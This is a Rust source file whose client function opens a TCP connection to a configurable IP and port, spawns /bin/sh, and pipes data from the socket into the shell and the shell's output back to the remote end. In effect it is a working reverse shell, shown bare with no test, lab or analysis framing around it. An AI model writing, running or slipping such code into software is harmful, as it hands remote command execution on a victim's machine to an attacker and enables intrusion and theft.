use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};

pub struct Config {
	pub ip: String,
	pub port: u32,
}

pub fn client(config: Config) {
	// Connect to the remote host and get a TcpStream
	let mut stream = TcpStream::connect(format!("{}:{}", config.ip, config.port)).unwrap();

	// Set up a pipe to read from stdin and write to the TcpStream
	let stdin = std::io::stdin();
	let mut stdout = std::io::stdout();

	// Spawn a new process to execute a shell
	let mut process = Command::new("/bin/sh")
		.stdin(Stdio::piped())
		.stdout(Stdio::piped())
		.spawn()
		.unwrap();

	// Set up a pipe to read from the TcpStream and write to the process's stdin
	let mut process_stdin = process.stdin.take().unwrap();
	let mut process_stdout = process.stdout.take().unwrap();

	// Start a loop to transfer data between the TcpStream and the process
	loop {
		let mut buffer = [0; 1024];

		// Read from the TcpStream
		let n = stream.read(&mut buffer).unwrap();
		if n == 0 {
			break;
		}

		// Write to the process's stdin
		process_stdin.write_all(&buffer[..n]).unwrap();

		// Read from the process's stdout
		let n = process_stdout.read(&mut buffer).unwrap();
		if n == 0 {
			break;
		}

		// Write to the TcpStream
		stdout.write_all(&buffer[..n]).unwrap();
		stream.write_all(&buffer[..n]).unwrap();
		// stream.write_all(b"END\n").unwrap();
		stdout.flush().unwrap();
	}
}
